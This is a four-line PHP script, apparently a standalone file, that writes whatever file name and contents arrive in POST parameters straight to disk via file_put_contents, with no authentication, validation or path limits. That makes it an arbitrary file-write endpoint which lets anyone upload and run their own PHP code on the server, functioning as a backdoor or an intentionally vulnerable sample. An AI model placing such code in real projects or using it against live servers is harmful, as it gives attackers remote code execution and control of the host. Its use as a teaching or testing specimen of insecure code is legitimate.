<?php

$filename = $_POST['file'];
$data = $_POST['data'];

file_put_contents($filename, $data);

?>